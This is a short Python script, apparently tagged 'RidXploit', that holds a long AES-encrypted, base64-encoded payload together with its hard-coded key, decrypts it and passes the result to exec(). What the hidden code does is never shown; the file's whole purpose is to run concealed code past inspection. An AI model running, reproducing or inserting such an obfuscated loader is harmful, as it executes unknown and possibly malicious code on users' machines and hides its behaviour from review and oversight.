encrypted_code = "RidXploit_+a1w/fNIM0xsI9huwxayp9iy0VIfwkMLH12wYO9gxLiDEv61YxlNI5lDqaIY/EvkLIaFESIRKSfxwnLGiHJnjThEf7C5mXc4DnsyJhek4aB21pQWYhglMCWJpPxesJm/jdxK43XNZBQ5jZ7ncrclD8VBoEhpoqxwsjthZYRSSZJgfgygp+Kcm5b/HsNBkKgsm39/M8N0+WAg9lild0I7CiurqEB3o3o3/CwslBwtY21bKtXk5c3wQIzn8NUC2jXynlmTETVmKK7DvFSzQ4x1Xsl/P1J8V2ZirWJ5s+uMMLQJj9Cc8F84bbfLRuvCxIDqXkOqYuGvi83sJqK3LkeLBG2f+pZdJnCiAQIZMEsjBxjExN6fXHc45mfjev5iZnLLOJQLqMXsx/MahhXA/ZYnmjnNx5rHLaHGMhgKajc8ejNStpCXC8e4eaq3R+oS+CePT+nEOiEjlBiZH8KjichYqY9Jdpwu0Ayyn3+zGq3z4TVP3XiUXF0eTagq1831vxeF2z3XLNLgvaTYo1KdrSSPcLzD3pNwdW7XUOCnAYhTk9XUcAxcDf8yZ+7ny3Ia6Je32DBQ4NTJkoCrEHA87ImJMz9MLWHnxCQmTPb6I3FTgk7G4oobUACAq/sfigI30yRglO2g9J+5DrV0bfghuOg1w/RhsloZ7UMijG/3MTyqTpVStg6oOMROmcBdZYZk/xKMxHan2okaq0IkJ/I57jMqSYdmI9u+chmsIOfhvNi9jFKztAe/ftyNmewHJ4F1G2fHsIh+4hnj0Pp+1e3p/qvAM+9C6DqgeMNEwhlnPk4CuNOqPxs8TKuJKsWgAz2ayHBwEVDQ2mHRj6SdLcBHVp8PeVrzL0vptmpf5GxnokNtL8eR33ADoyOPCe9b8nwt8xpefOAsBa9jAnZQz6Ucf3kSiukkcbwaoo5Qg/URg35/Oy04KdeGIALZQeKSVYRMwCw7ibp7MUrrHieJRAdVHffQf4oTak9ZWbJUHv0CfhxOR/INilpbM0BrgrPVJGhe9Pg3w3fpEHfzkPYooX5ukAPhBi3Doua2BJ0n4+cYUmt4BYMBuFmdBmkQUCPCdCNrj4VY0FAfNNabRwF2ufImQCNAfMWcNGhcKcMK7E2iw5Xm99DXM/Rt2GaYjjb8aWNmI/oFKUOCwc0Yjbkaj1r9+oFVqO9x7IlUZQQq6/H9101QYFtllZfFdNitj3QkxTmHHe2nzWudSJfUFwLwhGnJXzoa14Epfdw0G+nyIfpeJBvRlB5YhfNLLcqAxW7VA4we0p3uuVCyVnYsrWKV8xZn3DRNPDbdN1hh44PPKpIZf65Ydk6dNIA897FjVCkK9/2MzK6Q2GRg71LQx/mKXrO4Wb/N0M0aDWtiBp5qwecHX9mvNtARjuyAi3299WsNAgXVQLPNOehIj6dPdfrGRkzKebB8nIwiVEN+9OVKnsyQEwdU6FxHnwcFsH3qmu+940SjyhP0yAxxdQBqfvUgsQAB8CA2ipk7vHZ9aAG650tBmna0pnXXp47Jy0q1IkeUIxNrXCnFn6FRR2azMvTlV67Wn+0Z0muV2pepdx1oFlnNIOHHodAKmtADU2VtK7MYU+7PmRkwFtZuO9reWeBnNJxQ5t2zXFdnku94b0wCWam8ovw3rtStqf9vsjoEeNSHxFAz/ufVua2LGUSfuU0rQGPSU5z5MgPkaXLTNHqsWJZ+v38nRvoQPSzyVQyBaU+KNstm1RDqQnXELLGGfbbnhXAf7jE9aXkfQWrXF/Fyc/t9fMcPKquhg/fbkgRqPcDSHfhakD079xHGeu52Bn76+Gu00Ds51yv1Ry8oahTSCPoCJylNoB6m9zxcODFZFJ1zWXSAYdeu0dXsGkNR9dZs8wnW/GturXq4olY6GZ/LTnWeKC2WYPngEwfMnFVSLSgRDInClGHoHDkTZKveaxkaejOsdQre5/7qyyfPeq2AtJQslP3xudaOH/lwwpof7v6i2NlEK2yefMf/DbKo8RN/UsUdQniSxi3nbOuARCUwiE+j33tX31tmZ/bKYBJt0eFZhr9LJI/ZhF/7j0kgFkO30x6bKRPvEVDb3AtnRIuqwYibCD4vnVccoyObD5DHKu81TKh3Iur2h1zZmKU9D+ZisPGgJA3gno1CdxLQCcSAGpofn3gNdIzYGBxfCKYV4oWqWZYOR3i/8O/8DX4PJFf7XEo9qv05unbw/f9/8m2QIZ6pckO9D2KGRMmlqTAccUzK+bjl+uxraePB96CX8uQ60Dz8ctmSiKXC4xWziExoK8+4fAHdGjPChfAZwDzSNDHXzO79SUJSbdj/6MhJ3ekKhI+WxxNf0FznzvbDWM9nXjiHY3UyhizC1H4GdwjNh3vDNgLYh/lpzTuT3WqRzyp1D7DFhDb8U+e5V8u53nvDc+GOj3I25/ZE0fRcFHx8V6UfXwAG7SRePgGhCK+CH8z6jWxdlWSdZm2yeioCT4HFthC/50TL2Rm8Q8XABizx3WO4Ck4v0FBzojmxPBju86mM37BilLVOUdpn6p9YSB7GLiW1NBZU1P6FBTKuXlK9+RL2/i0FR9iVj9Rexlx7gp5hce6N6tFdz2ncOgY7JpHw54vOH9ws/FH7Xn9X6PR1R/7yjiW2b1/Ae89Z+3SlhhAGoy4uSNUk4Q==_RidXploit"
key = bytes.fromhex("e791389784b1382c768a568005479454cff1ea2a486dceda623ed1aaca4326e8")


import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(data, key):
    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

decrypted_code = aes_decrypt(encrypted_code, key)
exec(decrypted_code.decode('utf-8'))
